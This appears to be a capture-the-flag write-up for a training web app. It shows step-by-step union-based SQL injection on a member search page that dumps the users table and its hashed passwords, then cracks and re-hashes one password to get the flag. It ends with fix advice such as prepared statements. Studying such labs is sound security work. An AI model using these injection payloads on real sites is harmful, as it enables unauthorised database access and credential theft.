```
http://{IP_ADDRESS}/?page=member
```

When we entered the Members page, we saw that we could search for a user.
After writing "1" in the search section, we encountered something like this:

```html
ID: 1
First name: one
Surname: me
```

Then we made our query as 2-1.

```html
ID: 2-1
First name: one
Surname: me
```

This way we understood the existence of SQL injection. You can test with "1 AND 1=1" or other variations if you prefer.

Now when using our own query, we'll use `UNION SELECT`, but the number of columns in the original query must exactly match the number of columns from our injection.
For this reason, we need to find the number of columns.

```
1 ORDER BY 1        ✔

1 ORDER BY 2        ✔

1 ORDER BY 3        X

Unknown column '3' in 'order clause'
```

We learned there are 2 columns.

```
1 UNION SELECT null, concat (table_name) from information_schema.tables where table_schema = database ()  
```

We execute this query.

```
ID: 1 UNION SELECT null, concat (table_name) from information_schema.tables where table_schema = database ()   
First name: 
Surname : users
```

Now that we know the table name:

```
1 UNION SELECT table_name, column_name FROM information_schema.columns
```

With this query we call table_name and column_name. The part that will be relevant for us is the `users` part.

```
[...]
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : user_id

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : first_name

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : last_name

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : town

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : country

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : planet

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : Commentaire

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : countersign
[...]
```

```
1 UNION SELECT first_name, user_id FROM users

1 UNION SELECT first_name, first_name FROM users

1 UNION SELECT first_name, last_name FROM users

1 UNION SELECT first_name, town FROM users

1 UNION SELECT first_name, country FROM users

1 UNION SELECT first_name, planet FROM users

1 UNION SELECT first_name, Commentaire FROM users

1 UNION SELECT first_name, countersign FROM users

```

You can query each one individually to learn more.

```
-1 UNION SELECT Commentaire, countersign from users
```

```
ID: -1 union select Commentaire, countersign from users 
First name: Je pense, donc je suis
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9

ID: -1 union select Commentaire, countersign from users 
First name: Aamu on iltaa viisaampi.
Surname : 60e9032c586fb422e2c16dee6286cf10

ID: -1 union select Commentaire, countersign from users 
First name: Dublin is a city of stories and secrets.
Surname : e083b24a01c483437bcf4a9eea7c1b4d

ID: -1 union select Commentaire, countersign from users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

We looked at what this hash might be using the website we used in our previous project. You can use tools like `hashid` or any hash finder if you prefer.

```
https://www.dcode.fr/
```

We had it automatically analyzed and saw it was MD5, and when decrypted:

It turned out to be `FortyTwo`. Now we'll make everything lowercase and hash it with sha256.

```
 ~  echo -n "fortytwo" | sha256sum
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  -
```


## How to fix

-   Use Prepared Statements. Data received from users is not directly included in SQL queries. Instead, data is bound to the query as parameters and processed securely by the database engine, which prevents SQL Injection attacks.

-   Restrict SQL account permissions to limit possible damage in case of an attack.

-   Hide error messages, even though this doesn't directly prevent SQL injection.

-   You can filter user inputs.

-   Use WAF (Web Application Firewall).